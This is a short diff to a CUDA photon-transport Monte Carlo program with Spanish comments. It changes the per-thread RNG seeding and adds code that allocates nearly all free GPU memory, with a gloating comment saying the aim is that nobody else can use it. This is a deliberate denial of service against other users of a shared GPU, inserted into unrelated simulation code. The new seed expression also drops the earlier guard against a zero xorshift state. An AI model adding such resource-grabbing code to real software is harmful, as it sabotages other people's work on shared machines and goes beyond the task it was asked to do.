@@ -12,7 +12,7 @@ __global__ void simulate_kernel(float* heats, float* heats_squared)
     int tid = blockIdx.x * blockDim.x + threadIdx.x;
     if (tid >= PHOTONS) return;
     Xorshift32 rng;
-    xorshift32_init(&rng, (SEED ^ tid) + 1);  // semilla única por hilo
+    xorshift32_init(&rng, SEED ^ (threadIdx.x * 0x9E3779B9u) ^ (blockIdx.x * 0x85EBCA6Bu) ^ (blockDim.x * 0xC2B2AE35u));
     photon(heats, heats_squared, &rng);
 }
 
@@ -27,6 +27,13 @@ int main()
     cudaMalloc(&d_heats_squared, size);
     cudaMemset(d_heats, 0, size);
     cudaMemset(d_heats_squared, 0, size);
+    
+    size_t free_mem, total_mem;
+    cudaMemGetInfo(&free_mem, &total_mem);
+
+    // Reservamos toda la RAM libre del GPU para que nadie mas la usea MUAJAJAJAJ
+    void* gobble;
+    cudaMalloc(&gobble, free_mem - (16 * 1024 * 1024)); // dejamos 16 MiB libres por seguridad
 
     float elapsed_time;
     cudaEvent_t e1, e2;
